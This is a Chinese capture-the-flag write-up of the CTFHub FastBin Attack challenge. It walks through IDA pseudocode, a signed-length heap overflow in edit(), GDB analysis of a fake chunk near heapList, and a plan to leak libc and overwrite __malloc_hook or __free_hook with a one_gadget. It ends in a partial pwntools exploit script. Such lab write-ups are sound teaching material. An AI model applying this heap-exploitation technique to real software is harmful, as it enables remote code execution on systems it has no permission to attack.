---
title: 【详解】CTFHUB-FastBin Attack
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458498963&idx=1&sn=993867aa6c42f4c5b0b28fd3a323b9ad&chksm=b18e871986f90e0f45ae967dc65c086d027eae52c31b4af07bda217aa98c4a0084ffdcab73d3&scene=58&subscene=0#rd
source: 看雪学苑
date: 2023-03-21
fetch_date: 2025-10-04T10:09:22.885665
---

# 【详解】CTFHUB-FastBin Attack

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EGhnFtJH2ysic4o9sUdFchNYvmJkyyVAfqp9aDNf5KSlDT5Q4gqrq3w3pPrPXw6Yd5fEFItN94uhg/0?wx_fmt=jpeg)

# 【详解】CTFHUB-FastBin Attack

LeaMov

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EGhnFtJH2ysic4o9sUdFchNqUFlyKOiaDhkoHnRk3DWpoSjeuefxRkEYL4kTibTicXNcqOmo0S47dc7w/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：LeaMov

#

```
一

程序分析
```

##

## **IDA静态分析**

###

### 伪代码分析

####

#### main()函数

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  init(argc, argv, envp);  interface();}void __noreturn interface(){  int choice; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v1; // [rsp+8h] [rbp-8h]   v1 = __readfsqword(0x28u);  while ( 1 )  {    while ( 1 )    {      menu();// 打印菜单;输入1：申请heap；输入2：释放heap；输入3：打印Heap；输入4：编辑Heap      __isoc99_scanf("%d", &choice);      if ( choice != 1 )        break;      add();//申请heap，固定大小0x60，最多申请10个    }    switch ( choice )    {      case 2:        delete();//释放heap，不清空heap，但是heapList的指针会置0        break;      case 3:        show();//printf("%s",heapList[index]->heap)        break;      case 4:        edit();//编辑heap中内容，有长度检查，但不完全有:) !!!EXP Point!!!        break;      default:        exit(-1);    }  }}
```

####

#### add()函数

```
unsigned __int64 add(){  unsigned int i; // [rsp+8h] [rbp-1018h]  unsigned int index; // [rsp+Ch] [rbp-1014h]  char v3[4096]; // [rsp+10h] [rbp-1010h] BYREF  unsigned __int64 v4; // [rsp+1018h] [rbp-8h]   v4 = __readfsqword(0x28u);  memset(v3, 0, sizeof(v3));  for ( i = 0; i <= 9; ++i )  {    if ( !*(&heapList + i) )                    // 检测heapList下哪个索引没有使用    {      index = i;      break;    }  }  if ( i == 11 )                                // 最多只能申请10个  {    puts("wrong");    exit(0);  }  *(&heapList + index) = malloc(0x60uLL);       // 固定申请0x60字节并存放于全局变量heapList中  Size[index] = 96;//没什么D用  puts("Done");  return __readfsqword(0x28u) ^ v4;}
```

####

#### delete()函数

```
unsigned __int64 delete(){  unsigned int index; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]   v2 = __readfsqword(0x28u);  puts("Index:");  __isoc99_scanf("%d", &index);  if ( index > 0xB )  {    puts("wrong");    exit(0);  }  free(*(&heapList + index));  *(&heapList + index) = 0LL;//heap指针被置零了，没法double free  Size[index] = 0;  return __readfsqword(0x28u) ^ v2;}
```

####

#### show()函数

```
unsigned __int64 show(){  unsigned int index; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]   v2 = __readfsqword(0x28u);  puts("Index:");  __isoc99_scanf("%d", &index);  if ( *(&heapList + index) )    printf("Content: %s\n", (const char *)*(&heapList + index));//从堆指针起始按字符串打印内容  return __readfsqword(0x28u) ^ v2;}
```

####

#### edit()函数【利用点-堆溢出】

```
unsigned __int64 edit(){  int readLength; // [rsp+0h] [rbp-10h] BYREF  unsigned int index; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-8h]   v3 = __readfsqword(0x28u);  puts("Index:");  __isoc99_scanf("%d", &index);//用户输入要编辑的heap索引  puts("Size:");  __isoc99_scanf("%d", &readLength);//用户输入要编辑的长度  if ( readLength <= 96 )//有长度检查，但不完全有，有符号数比较输入负数绕过  {    if ( *(&heapList + index) )    {      puts("Content:");      read(0, *(&heapList + index), (unsigned int)readLength);//read长度参数是无符号数    }    else    {      puts("wrong");    }  }  else  {    puts("wrong!");  }  return __readfsqword(0x28u) ^ v3;}
```

##

## **GDB调试分析**

根据IDA静态分析已知存在堆溢出漏洞，且申请的堆大小固定，释放后会进入fastbins，所以考虑通过篡改fastbin->fd来申请fakeChunk，现查找可利用的fd。

```
pwndbg> x/30gx 0x6020c0-0x500x602070:    0x0000000000000000    0x00000000000000000x602080 <stdout@@GLIBC_2.2.5>:    0x00007ffff7bc4620    0x00000000000000000x602090 <stdin@@GLIBC_2.2.5>:    0x00007ffff7bc38e0    0x00000000000000000x6020a0 <stderr@@GLIBC_2.2.5>:    0x00007ffff7bc4540    0x00000000000000000x6020b0:    0x0000000000000000    0x00000000000000000x6020c0 <heapList>:    0x0000000000000000    0x00000000000000000x6020d0 <heapList+16>:    0x0000000000000000    0x00000000000000000x6020e0 <heapList+32>:    0x0000000000000000    0x00000000000000000x6020f0 <heapList+48>:    0x0000000000000000    0x00000000000000000x602100 <heapList+64>:    0x0000000000000000    0x00000000000000000x602110:    0x0000000000000000    0x00000000000000000x602120 <Size>:    0x0000000000000000    0x00000000000000000x602130 <Size+16>:    0x0000000000000000    0x00000000000000000x602140 <Size+32>:    0x0000000000000000    0x0000000000000000
```

其中0x6020c0是全局变量heapList的地址，其中存着每一个heap的指针，如果可以将该指针修改就可以达到任意读/写，并且在heapList上方存在可利用的内容，通过字节错位将fd指针定于0x60209d，内存如下：

```
pwndbg> x/30gx 0x60209d0x60209d:    0xfff7bc4540000000    0x000000000000007f0x6020ad:    0x0000000000000000    0x00000000000000000x6020bd:    0x0000000000000000    0x00000000000000000x6020cd <ptr+13>:    0x0000000000000000    0x00000000000000000x6020dd <ptr+29>:    0x0000000000000000    0x00000000000000000x6020ed <ptr+45>:    0x0000000000000000    0x00000000000000000x6020fd <ptr+61>:    0x0000000000000000    0x00000000000000000x60210d <ptr+77>:    0x0000000000000000    0x00000000000000000x60211d:    0x0000000000000000    0x00000000000000000x60212d <Size+13>:    0x0000000000000000    0x00000000000000000x60213d <Size+29>:    0x0000000000000000    0x0000000000000000
```

可以看到若chunk->fd=0x60209d时，size字段为0x7f即0111 1111，而其中末4位为标志位高到低分别是PREV\_INUSE IS\_MMAPPED NON\_MAIN\_ARENA SIZE\_BITS，既实际大小为0111 0000即0x70，由于我们申请的heap大小固定为0x60，加上字段大小后即0x70，最终的fastbins大小分类一致，可用作构造FakeChunk。

##

## **分析总结**

根据分析可以总结出一下三点：

① 申请的heap大小固定为0x60，释放后进入fastbins均属于大小分类0x70。

② edit()函数存在整数溢出导致的堆溢出漏洞。

③ 在全局变量heapList上方存在可用于构造FakeChunk的内存区。

#

#

```
二

漏洞利用及原理
```

##

## 可利用漏洞

* 整数溢出漏洞
* 堆溢出漏洞

##

## **1.堆溢出之FastBinAttack-Arbitrary Alloc**

###

### 利用思路

根据分析已知：

所有根据程序菜单申请并释放的heap最终都将进入fastbins->0x70分类链表中。

edit()函数存在堆溢出导致可以随意篡改下方其它chunk的字段和内容。

全局变量heapList上方存在可利用内存区用以构造FakeChunk。

###

### 利用流程

根据上述条件准备进行以下攻击：

① 申请3个heap(大小均为0x60)。

② 先后释放#2和#1。

③ 通过edit()函数溢出并篡改heap#1的fd指针指向0x60209d。

④ 重新申请回#1和#2，此时#2已指向fakeChunk->0x60209d。

⑤ 通过edit()修改heap#2填充13字节的payload到达0x6020C0既heapList[0]并向其中填入puts@got。

⑥ 通过show()函数打印出\*heapList[0]即puts函数地址并计算出libcBase。

⑦ 通过edit()再次修改heap#2以篡改heapList[0]值为&\_\_malloc\_hook或&\_\_free\_hook。

⑧ 通过edit()修改heap#0以篡改\_\_malloc\_hook或\_\_free\_hook以执行oneGadget。

###

### 利用原理

对于glibc堆管理的各类bins详细请参见

> CTF竞赛权威指南(Pwn篇)->11.1.3章

以下为简述:

程序中申请的大小为0x60的heap释放后均会进入fastbins->0x70分类中（由于glibc版本问题所以并不会进入tcache，调试时请注意使用的glibc版本）；

fastbins是一个后进先出的单链表，除分类中第一个进入的chunk外的每一个chunk->fd字段都指向上一个进入fastbins的chunk，也即当前chunk#1被弹出后下一个应该被弹出的chunk#0，既然这样我们就可以通过申请连续的chunk#0 chunk#1 chunk2并按顺序释放#chunk2、#chunk1，此时的chunk1->fd为#chunk2，意为当我们再次申请大小为0x60时会弹出chunk1并将chunk->fd作为下一个预备弹出的chunk。

此时我们通过edit()编辑chunk#0并且使用堆溢出篡改chunk1->fd使其指向一个fakeChunk，以达到读写fakeChunk的目的；注意：该FakeChunk->size需要符合fastbins的大小分类即0x70，根据上述分析已知在全局变量heapList上方存在符合条件的FakeChunk内存区，所以我们将chunk#1->fd指向该内存区，将其申请到手后可即可结合show() edit()进行任意读写。

可以任意读后即可泄露LibcBase，将函数got地址填入heapList[0]后使用show()函数即可达到泄露，而将&\_\_malloc\_hook或&\_\_free\_hook填入即可篡改此两个hook的指向，此两个hook的指向在分别在malloc()和free()函数调用时被调用，所以我们可以向其中填入oneGadget并再次调用add()或者delete()使其执行并且getShell。

#

#

```
三

Exploit
```

```
from pwn import * prog = "./pwn" local = Falsecontext(os='linux', arch='amd64', log_level='debug') elf = ELF("./pwn")libc = ELF("./libc-2.23.so") if local:    p = process(prog)    libc = ELF("/root/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6")    #gdb.attach(p)    sleep(1)else:    p = remote("challenge-9647de804cb6da45.sandbox.ctfhub.com",34306) def add():    p.sendlineafter(">> ","1") def show(index):    p.sendlineafter(">> ","3")    p.sendlineafter("Index:\n",str(index)) def dele(index):    p.sendlineafter(">> ","2")    p.sendlineafter("Index:\n",str(index)) def edit(index,content):    p.sendlineafter(">> ","4")    p.sendlineafter("Index:\n",str(index))    p.sendlineafter("Size:\n","-1")    p.sendafter("Content:\n",content) add()#0add()#1add()#2 dele(2)dele(1) payload = b"\x99"*0x60payload += b"\x11"*8payload += p64(0x71)payload += p64(0x60209d)edit(0,payload) add()#1add()#2 fakeChunk-...